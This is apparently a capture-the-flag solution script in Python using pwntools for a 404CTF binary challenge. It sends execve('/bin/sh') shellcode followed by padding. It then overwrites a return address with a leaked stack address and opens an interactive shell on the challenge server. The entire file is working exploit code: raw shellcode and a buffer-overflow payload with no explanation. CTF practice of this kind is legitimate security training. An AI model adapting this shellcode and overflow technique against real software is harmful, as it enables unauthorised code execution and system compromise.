#!/usr/bin/env python3

from pwn import *

TEST = False

context.update(arch="amd64", os="linux", endian="little", bits=64)

def payload(addr):
    pl = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    pl += b"A" * 45
    pl += p64(int(addr, 16))
    return pl

def main():
    if TEST:
        nc = process("/home/syca/404CTF/binexploits/sans_protection/fragile")
    else:
        nc = remote("challenge.404ctf.fr", 31720)
    
    nc.readuntil(b"Cadeau : ")
    r = nc.readlineS().strip()
    nc.sendline(payload(r))
    nc.interactive()

main()
